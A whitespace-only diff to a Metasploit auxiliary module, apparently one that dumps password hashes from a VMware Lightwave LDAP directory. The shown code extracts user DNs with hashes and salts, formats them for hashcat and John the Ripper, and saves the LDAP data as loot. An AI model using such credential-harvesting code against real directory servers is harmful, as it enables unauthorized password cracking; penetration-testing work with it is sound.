@@ -108,12 +108,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def pillage(entries)
-    
+
     entries.each do |entry|
       dn = entry.dn
       userpass = entry.userpassword.first.to_s
       type = userpass[0].ord
-      
+  
       # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/lwraft/server/middle-layer/password.c#L36
       unless type == 1
         print_status("DN: #{dn}")
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{peer} #{dn}:#{hash}:#{salt}")
       write_output_files(rhost, dn, hash, salt)
     end
-    
+
     ldif = entries.map(&:to_ldif).join("\n")
 
     print_status('Storing LDAP data in loot')
@@ -145,11 +145,11 @@ class MetasploitModule < Msf::Auxiliary
       print_error('Could not store LDAP data in loot')
       return
     end
-    
+
     print_good("Saved LDAP data to #{ldif_filename}")
 
   end
-  
+
   def write_output_files(rhost, username, hash, salt)
     # -m 1710
     if datastore['OUTPUT_HASHCAT_FILE']
@@ -158,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
         fd.flush
       end
     end
-    
+
     # -format='dynamic=sha512($p.$s)'
     if datastore['OUTPUT_JOHN_FILE']
       ::File.open(datastore['OUTPUT_JOHN_FILE'], "ab") do |fd|
